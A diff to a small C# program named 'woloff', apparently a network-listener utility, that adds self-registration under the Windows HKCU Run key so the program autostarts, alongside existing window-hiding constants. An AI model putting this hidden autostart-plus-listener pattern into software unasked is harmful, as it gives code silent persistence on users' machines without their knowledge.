@@ -1,12 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
+
 
 namespace woloff
 {
@@ -21,6 +19,7 @@ namespace woloff
 
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
+        
 
 
         private static void StartListener()
@@ -62,7 +61,12 @@ namespace woloff
 
         public static void Main()
         {
-        StartListener();
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey
+            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rk.SetValue("woloff.exe", @"C:\Users\omer\Desktop\woloff.exe");
+            
+            StartListener();
+            
         }
 
     }
